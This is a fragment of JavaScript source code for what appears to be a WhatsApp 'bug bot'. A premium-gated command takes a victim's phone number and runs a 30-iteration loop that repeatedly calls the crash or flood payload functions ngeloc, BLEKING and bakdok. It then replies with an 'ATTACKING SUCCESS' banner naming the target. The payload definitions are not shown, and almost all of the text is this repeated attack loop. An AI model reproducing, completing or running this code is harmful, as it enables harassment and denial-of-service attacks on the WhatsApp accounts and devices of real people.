await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
